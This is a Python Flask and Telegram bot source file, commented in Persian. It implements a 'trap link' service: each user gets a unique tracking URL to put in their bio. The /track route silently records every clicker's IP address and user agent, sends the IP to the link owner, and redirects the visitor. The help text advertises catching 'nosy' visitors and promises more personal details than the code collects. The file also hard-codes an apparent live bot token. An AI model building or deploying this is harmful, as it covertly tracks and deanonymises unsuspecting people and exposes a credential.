import os
import sqlite3
import random
import string
from datetime import datetime
from flask import Flask, request, redirect, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import threading

# ---------- تنظیمات اولیه ----------
TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
BASE_URL = "https://barcelona-l5tu.onrender.com"
CHANNELS = ["@film01385"]
CHANNEL_NAMES = {
    "@film01385": "کانال اول",
}

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ---------- دیکشنری برای ذخیره پیام لینک هر کاربر ----------
user_link_messages = {}

# ---------- دیتابیس ----------
conn = sqlite3.connect("/tmp/tracker.db", check_same_thread=False)
c = conn.cursor()

c.execute("""CREATE TABLE IF NOT EXISTS users (
    telegram_id INTEGER PRIMARY KEY,
    link_code TEXT UNIQUE,
    link_full TEXT UNIQUE
)""")

c.execute("""CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_code TEXT,
    ip TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)""")

c.execute("""CREATE TABLE IF NOT EXISTS user_settings (
    telegram_id INTEGER PRIMARY KEY,
    capture_text TEXT,
    capture_photo_id TEXT
)""")
conn.commit()

# ---------- توابع کمکی ----------
def get_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0]
    return request.remote_addr

def generate_link(telegram_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    full_link = f"{BASE_URL}/track/{code}"
    c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code, link_full) VALUES (?, ?, ?)", 
              (telegram_id, code, full_link))
    conn.commit()
    return full_link

def get_user_id_by_code(code):
    c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
    result = c.fetchone()
    return result[0] if result else None

def get_user_capture_text(user_id):
    c.execute("SELECT capture_text FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else "🎯 یک نفر روی لینک اختصاصی شما کلیک کرد!"

def get_user_capture_photo(user_id):
    c.execute("SELECT capture_photo_id FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else None

def save_user_settings(user_id, text=None, photo_id=None):
    c.execute("SELECT * FROM user_settings WHERE telegram_id = ?", (user_id,))
    if c.fetchone():
        if text:
            c.execute("UPDATE user_settings SET capture_text = ? WHERE telegram_id = ?", (text, user_id))
        if photo_id:
            c.execute("UPDATE user_settings SET capture_photo_id = ? WHERE telegram_id = ?", (photo_id, user_id))
    else:
        c.execute("INSERT INTO user_settings (telegram_id, capture_text, capture_photo_id) VALUES (?, ?, ?)",
                  (user_id, text, photo_id))
    conn.commit()

# ---------- بررسی عضویت ----------
def is_user_member(user_id):
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
    return True

# ---------- ایجاد Reply Keyboard (صفحه‌کلید دائمی) ----------
def get_main_reply_keyboard():
    """ساخت صفحه کلید دائمی با دکمه‌های شیشه‌ای"""
    keyboard = ReplyKeyboardMarkup(
        row_width=2,  # تعداد دکمه در هر ردیف
        resize_keyboard=True,  # اندازه کیبورد را با صفحه هماهنگ کن
        one_time_keyboard=False,  # کیبورد پس از استفاده بسته نشود (دائمی)
        input_field_placeholder="یک گزینه را انتخاب کنید..."  # متن راهنما در باکس ورودی
    )
    
    # ایجاد دکمه‌ها
    btn_get_link = KeyboardButton("🔗 دریافت لینک من")
    btn_buy_sub = KeyboardButton("💰 خرید اشتراک پرو")
    btn_buy_shield = KeyboardButton("🛡 خرید سپر")
    btn_set_photo = KeyboardButton("🖼 تنظیم عکس مچ‌گیری")
    btn_set_text = KeyboardButton("✏️ تنظیم متن مچ‌گیری")
    btn_help = KeyboardButton("📖 راهنما")
    
    # چیدمان دکمه‌ها در کیبورد
    keyboard.add(btn_get_link, btn_buy_sub)
    keyboard.add(btn_buy_shield, btn_set_photo)
    keyboard.add(btn_set_text, btn_help)
    
    return keyboard

# ---------- نمایش پنل کاربری با Reply Keyboard ----------
def show_panel(chat_id, message_id=None):
    # ساخت Inline Keyboard برای عملیات خاص (مثل کپی، مخفی کردن و...)
    # توجه: Reply Keyboard قبلاً ارسال شده، اینجا فقط در صورت نیاز از Inline استفاده می‌کنیم
    text = "👋 به پنل کاربری خود خوش آمدید.\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
    
    if message_id:
        # اگر در حال ادیت یک پیام هستیم، فقط متن را ادیت می‌کنیم (Reply Keyboard قبلاً وجود دارد)
        bot.edit_message_text(text, chat_id, message_id)
    else:
        # ارسال پیام جدید همراه با Reply Keyboard
        reply_keyboard = get_main_reply_keyboard()
        bot.send_message(chat_id, text, reply_markup=reply_keyboard)

# ---------- هندلر جدید برای مدیریت دکمه‌های Reply Keyboard ----------
@bot.message_handler(func=lambda message: True)
def handle_reply_buttons(message):
    """هندلر تمام پیام‌های متنی - برای تشخیص دکمه‌های Reply Keyboard"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text
    
    # بررسی اینکه کاربر عضو کانال هست یا نه
    if not is_user_member(user_id):
        # اگر عضو نیست، درخواست عضویت بده
        keyboard = InlineKeyboardMarkup(row_width=1)
        for channel in CHANNELS:
            display_name = CHANNEL_NAMES.get(channel, channel)
            keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
        keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard, parse_mode='Markdown')
        return
    
    # پردازش دکمه‌های Reply Keyboard
    if text == "🔗 دریافت لینک من":
        link = generate_link(user_id)
        link_code = link.split('/')[-1]
        
        # ساخت Inline Keyboard برای عملیات لینک
        inline_keyboard = InlineKeyboardMarkup(row_width=2)
        inline_keyboard.add(
            InlineKeyboardButton("📋 کپی لینک من", callback_data=f"copy_{link_code}"),
            InlineKeyboardButton("🔒 مخفی کردن لینک", callback_data="hide_link")
        )
        
        msg = bot.send_message(
            chat_id,
            f"🔗 **لینک اختصاصی شما:**\n\n"
            f"`{link}`",
            reply_markup=inline_keyboard,
            parse_mode='Markdown'
        )
        
        user_link_messages[user_id] = {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "link_code": link_code
        }
    
    elif text == "💰 خرید اشتراک پرو":
        bot.send_message(chat_id, "💰 بخش خرید اشتراک پرو در حال توسعه است.\nبه زودی...")
    
    elif text == "🛡 خرید سپر":
        bot.send_message(chat_id, "🛡 بخش خرید سپر در حال توسعه است.\nبه زودی...")
    
    elif text == "🖼 تنظیم عکس مچ‌گیری":
        msg = bot.send_message(
            chat_id,
            "🖼 لطفاً عکس مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال عکس، تنظیمات شما ذخیره می‌شود."
        )
        bot.register_next_step_handler(msg, receive_capture_photo)
    
    elif text == "✏️ تنظیم متن مچ‌گیری":
        msg = bot.send_message(
            chat_id,
            "✏️ لطفاً متن مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال متن، تنظیمات شما ذخیره می‌شود."
        )
        bot.register_next_step_handler(msg, receive_capture_text)
    
    elif text == "📖 راهنما":
        help_text = (
            "📚 **راهنمای جامع استفاده از ربات**\n\n"
            "**۱. نحوه کارکرد ربات (سیستم مچ‌گیری):**\n"
            "شما می‌توانید با دریافت لینک اختصاصی خود از طریق ربات و قرار دادن آن در بخش بیوگرافی (Bio) "
            "حساب کاربری‌تان، متوجه شوید چه کسانی در حال بازدید از پروفایل شما هستند.\n\n"
            "به محض اینکه شخصی از روی کنجکاوی روی لینک شما کلیک کرده و وارد ربات شود، "
            "ربات فوراً پیامی با مضمون «یک فضول در تله افتاد!» برای شما ارسال می‌کند. "
            "این گزارش شامل اطلاعات کامل شخص است:\n"
            "▫️ نام کاربر\n▫️ آیدی (لینک ورود به پیوی)\n▫️ عکس پروفایل\n▫️ بیوگرافی (در صورت وجود)\n\n"
            "**۲. اشتراک ویژه (پرو - ۳۰ روزه):**\n"
            "با تهیه اشتراک پرو، امکانات پیشرفته زیر در اختیار شما قرار می‌گیرد:\n"
            "🔹 **ارسال پیام ناشناس:** می‌توانید از طریق ربات، برای شخصی که در تله شما افتاده است به صورت کاملاً ناشناس پیام ارسال کنید.\n"
            "🔹 **مشاهده پروفایل افراد بدون آیدی:** اگر شخصی که در تله افتاده آیدی عمومی (Username) نداشته باشد، "
            "با اشتراک پرو همچنان می‌توانید عکس پروفایل و بیوگرافی او را مشاهده کنید.\n\n"
            "**۳. شخصی‌سازی تله (متن و عکس مچ‌گیری):**\n"
            "شما می‌توانید واکنش ربات به فردی که در تله می‌افتد را کاملاً شخصی‌سازی کنید:\n"
            "🔹 **تنظیم متن مچ‌گیری:** پیامی که فرد به محض کلیک روی لینک شما دریافت می‌کند را تغییر دهید.\n"
            "🔹 **تنظیم عکس مچ‌گیری:** علاوه بر متن، می‌توانید یک تصویر دلخواه تنظیم کنید تا به محض ورود شخص، آن عکس نیز برای وی ارسال شود.\n\n"
            "**۴. اشتراک سپر (محافظت و مچ‌گیری آنی):**\n"
            "داشتن اشتراک سپر، امنیت و سرعت شما را به حداکثر می‌رساند:\n"
            "🔹 **محافظت از شما:** اگر خودتان روی لینک شخص دیگری کلیک کنید و در تله بیفتید، گزارش ورود شما کاملاً مسدود شده و برای طرف مقابل ارسال نخواهد شد.\n"
            "🔹 **گزارش آنی و قطعی:** به محض اینکه شخصی در تله شما بیفتد، گزارش آن بدون هیچ وقفه‌ای و به صورت آنی برای شما ارسال می‌شود.\n\n"
            "💬 در صورت بروز هرگونه مشکل یا داشتن سوالات بیشتر، با @Ao_0077 در ارتباط باشید."
        )
        
        bot.send_message(chat_id, help_text, parse_mode='Markdown')
    
    else:
        # اگر پیام متنی معمولی بود که با دکمه‌ها مطابقت ندارد
        bot.send_message(chat_id, "❌ لطفاً از دکمه‌های زیر استفاده کنید.", reply_markup=get_main_reply_keyboard())

# ---------- هندلر دستور start ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_user_member(user_id):
        show_panel(message.chat.id)
    else:
        keyboard = InlineKeyboardMarkup(row_width=1)
        
        for channel in CHANNELS:
            display_name = CHANNEL_NAMES.get(channel, channel)
            keyboard.add(InlineKeyboardButton(
                f"🔹 {display_name}", 
                url=f"https://t.me/{channel[1:]}"
            ))
        
        keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
        
        bot.reply_to(
            message,
            "👋 **برای استفاده از ربات ابتدا در کانال های زیر عضو شوید :**",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )

# ---------- هندلر دکمه‌های Inline (شیشه‌ای داخل پیام) ----------
@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data == "check_membership":
        if is_user_member(user_id):
            bot.edit_message_text("✅ عضویت شما تأیید شد!", chat_id, call.message.message_id)
            show_panel(chat_id)
        else:
            bot.answer_callback_query(call.id, "❌ شما هنوز در همه کانال‌ها عضو نشده‌اید.", show_alert=True)
    
    elif call.data.startswith("copy_"):
        link_code = call.data.split("_")[1]
        link = f"{BASE_URL}/track/{link_code}"
        bot.send_message(chat_id, f"🔗 لینک اختصاصی شما برای کپی:\n\n`{link}`", parse_mode='Markdown')
        bot.answer_callback_query(call.id, "✅ لینک برای کپی ارسال شد!")
    
    elif call.data == "hide_link":
        bot.edit_message_text(
            "🔗 لینک شما مخفی شد. برای دریافت مجدد لینک، از پنل اصلی اقدام کنید.",
            chat_id, call.message.message_id
        )
        threading.Timer(2.0, lambda: show_panel(chat_id)).start()

# ---------- دریافت متن مچ‌گیری ----------
def receive_capture_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text
    
    save_user_settings(user_id, text=text)
    bot.send_message(chat_id, f"✅ متن مچ‌گیری شما با موفقیت ذخیره شد:\n\n{text}")
    show_panel(chat_id)

# ---------- دریافت عکس مچ‌گیری ----------
def receive_capture_photo(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if message.photo:
        photo_id = message.photo[-1].file_id
        save_user_settings(user_id, photo_id=photo_id)
        bot.send_message(chat_id, "✅ عکس مچ‌گیری شما با موفقیت ذخیره شد.")
    else:
        bot.send_message(chat_id, "❌ لطفاً یک عکس معتبر ارسال کنید.")
    
    show_panel(chat_id)

# ========== مسیرهای Flask ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/track/<code>')
def track_click(code):
    user_a_id = get_user_id_by_code(code)
    ip_address = get_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    c.execute("INSERT INTO clicks (link_code, ip, user_agent) VALUES (?, ?, ?)", 
              (code, ip_address, user_agent))
    conn.commit()
    
    if user_a_id and user_a_id in user_link_messages:
        msg_info = user_link_messages[user_a_id]
        try:
            capture_text = get_user_capture_text(user_a_id)
            bot.edit_message_text(
                f"🔗 لینک اختصاصی شما:\n\n"
                f"`{msg_info['link_code']}`\n\n"
                f"🎯 **{capture_text}**\n"
                f"📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                msg_info["chat_id"], msg_info["message_id"],
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Error updating message: {e}")
    
    if user_a_id:
        try:
            capture_text = get_user_capture_text(user_a_id)
            capture_photo = get_user_capture_photo(user_a_id)
            
            if capture_photo:
                bot.send_photo(
                    user_a_id,
                    capture_photo,
                    caption=f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
                )
            else:
                bot.send_message(
                    user_a_id,
                    f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
                )
        except Exception as e:
            print(f"Error sending to {user_a_id}: {e}")
    
    return redirect("https://t.me/your_channel", code=302)

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

@app.route('/', methods=['GET'])
def index():
    return "ربات آنلاین است", 200

def set_webhook():
    webhook_url = f"{BASE_URL}/webhook"
    result = bot.set_webhook(url=webhook_url)
    if result:
        print(f"✅ Webhook set: {webhook_url}")
    else:
        print("❌ Failed to set webhook")

if __name__ == '__main__':
    set_webhook()
    app.run(host='0.0.0.0', port=10000)
